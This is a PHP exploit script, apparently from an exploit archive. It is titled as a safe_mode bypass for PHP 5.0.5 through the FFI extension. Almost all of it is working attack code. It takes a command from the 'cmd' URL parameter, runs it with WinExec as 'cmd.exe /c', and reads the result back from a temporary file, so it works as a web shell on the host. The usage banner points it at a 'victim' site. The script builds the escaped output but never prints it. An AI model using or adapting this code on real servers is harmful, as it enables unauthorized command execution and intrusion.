PHP FFI Extension 5.0.5 Local Safe_mode Bypass Exploit
======================================================



<?php

##########################################################
###----------------------------------------------------###
###-----PHP FFI Extension Safe_mode Bypass Exploit-----###
###----------------------------------------------------###
###-Tested on 5.0.5------------------------------------###
###----------------------------------------------------###
###-Usage:-http://victim.net/NJ.php?cmd=[COMMAND]------###
###----------------------------------------------------###
###-PHP:-http://php.net--------------------------------###
###-FFI:-http://pecl.php.net/package/ffi---------------###
###----------------------------------------------------###
###-Author:--NetJackal---------------------------------###
###-Email:---nima_501[at]yahoo[dot]com-----------------###
###-Website:-http://netjackal.by.ru--------------------###
###----------------------------------------------------###
##########################################################

if(!extension_loaded(&#039;ffi&#039;))
die(&#039;ERROR: FFI extension is not loaded!&#039;);
$command=(empty($_GET[&#039;cmd&#039;]))?&#039;dir&#039;:$_GET[&#039;cmd&#039;];
if(is_writeable(dirname(__FILE__)))$tmp=dirname(__FILE__);
elseif(is_writeable(ini_get(&#039;session.save_path&#039;)))
$tmp=ini_get(&#039;session.save_path&#039;);
elseif(is_writeable(ini_get(&#039;upload_tmp_dir&#039;)))
$tmp=ini_get(&#039;upload_tmp_dir&#039;);
else die(&#039;ERROR: Move exploit to writeable folder.&#039;);
$output="$tmp\\".uniqid(&#039;NJ&#039;);
$api=new ffi("[lib=&#039;kernel32.dll&#039;] int WinExec(char *APP,int SW);");
$res=$api->WinExec("cmd.exe /c $command >\"$output\"",0);
while(!file_exists($output))sleep(1);
$con=&#039;&#039;;
$fp=fopen($output,&#039;r&#039;);
while(!feof($fp))$con.=fgets($fp,1024);
fclose($fp);
$con=htmlspecialchars($con);
unlink($output);
?>



